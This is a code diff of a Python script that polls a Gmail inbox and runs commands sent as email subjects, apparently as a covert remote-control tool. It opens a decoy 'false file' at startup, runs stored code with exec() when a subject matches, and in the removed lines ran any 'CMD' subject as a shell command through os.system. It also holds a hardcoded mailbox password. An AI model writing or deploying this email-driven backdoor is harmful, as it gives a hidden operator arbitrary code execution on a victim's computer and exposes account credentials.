@@ -5,13 +5,23 @@ import email
 import sys
 import os
 import time
-from stringco import *
+import hashlib
+from random import randint
+from subprocess import check_output
+#from stringco import *
+
+def hashh(s):
+    return hashlib.md5(s.encode()).digest()
+
+print(hashh('yveega@gmail.com'), sep="\n")
+
+exec(open('keys.txt', 'r').read())
 
 class actions:
     coms = []
     execs = []
     def __init__(self, fname):
-        file = open(fname, 'r')
+        file = openS(fname, 'r')
         inp = ''
         is_code = False
         code_part = ''
@@ -30,13 +40,26 @@ class actions:
                     code_part = code_part + inp
                 else:
                     self.coms.append(inp[:-1])
-    def find(self, s):
+        print(self.coms)
+        print(self.execs)
+    def find(self, st):
+        s = st.split()[0]
         for i in range(len(self.coms)):
+            print(self.coms, self.coms[i], s)
             if self.coms[i] == s:
+                #print(execs[i])
                 return self.execs[i]
 
-f_path = open('../HDBlond/path_to_false_file.txt', 'r')
-acts = actions('../HDBlond/actions.txt')
+def openS(fname, mode):
+    try:
+        file = open(fname, mode)
+    except:
+        _=0
+        #file = open('../HDBlond/' + fname, mode)
+    return file
+
+f_path = openS('path_to_false_file.txt', 'r')
+acts = actions('actions.txt')
 os.startfile(f_path.read())
 
 ORG_EMAIL   = "@gmail.com"
@@ -45,21 +68,22 @@ FROM_PWD    = "q1w2e3r4t5y6u7i8o9p0[-]="
 SMTP_SERVER = "imap.gmail.com"
 SMTP_PORT   = 993
 
-out = open('../HDBlond/output.txt', 'w')
+out = openS('output.txt', 'w')
 try:
-    file = open('../HDBlond/last_ind.txt', 'r')
+    file = openS('last_ind.txt', 'r')
 except:
-    file = open('../HDBlond/last_ind.txt', 'w')
+    file = openS('last_ind.txt', 'w')
     file.write('0')
     file.close()
-    file = open('../HDBlond/last_ind.txt', 'r')
+    file = openS('last_ind.txt', 'r')
 last_ind = int(file.readline())
 file.close()
 
+mail = imaplib.IMAP4_SSL(SMTP_SERVER)
+mail.login(FROM_EMAIL,FROM_PWD)
+
 def read_email_from_gmail():
-    global last_ind
-    mail = imaplib.IMAP4_SSL(SMTP_SERVER)
-    mail.login(FROM_EMAIL,FROM_PWD)
+    global last_ind, mail
     mail.select('inbox')
 
     typee, data = mail.search(None, 'ALL')
@@ -71,7 +95,7 @@ def read_email_from_gmail():
 
     if last_ind != len(id_list) - 1:
         for i in id_list[len(id_list) - 1:][::-1]:
-            file = open('../HDBlond/last_ind.txt', 'w')
+            file = openS('last_ind.txt', 'w')
             last_ind = len(id_list) - 1
             file.write(str(last_ind))
             file.close()
@@ -82,25 +106,27 @@ def read_email_from_gmail():
                     if isinstance(response_part[1], bytes):
                         msg = email.message_from_bytes(response_part[1])
                         email_subject = msg['subject']
-                        if email_subject == 'MINECRAFTRUN':
-                            return -1
-                        elif email_subject == 'MINECRAFTFLOW':
-                            return -2
-                        elif email_subject == 'STOP':
-                            quit()
-                        elif email_subject.startswith('CMD'):
-                            #print("THERE_THERE")
-                            text = ' '.join(email_subject.split()[1:])
-                            os.system('cmd /k "' + text + '"')
-                        else:
-                            exec(acts.find(email_subject))
+                        sender = msg['from']
+                        print('Got mail from', sender[sender.find('<') + 1:-1])
+                        if hashh(sender[sender.find('<') + 1:-1]) in keys:
+                            if email_subject == 'MINECRAFTRUN':
+                                return -1
+                            elif email_subject == 'MINECRAFTFLOW':
+                                return -2
+                            elif email_subject == 'STOP':
+                                quit()
+                            else:
+                                subject = email_subject
+                                #print(subject)
+                                exec(acts.find(email_subject))
                     else:
                         print('ERR')
     return -100
 
-m_path = open('../HDBlond/path_to_minecraft.txt', 'r')
+m_path = openS('path_to_minecraft.txt', 'r')
 print('Reading GMAIL', FROM_EMAIL)
-print('Please, wait while Chrome starts')
+print(keys)
+print('LOADING...')
 while True:
     try:
         res = read_email_from_gmail()
@@ -110,5 +136,5 @@ while True:
             for i in range(10):
                 os.startfile(m_path.read())
     except:
-        _=0
+        print('ERROR')
 out.close()
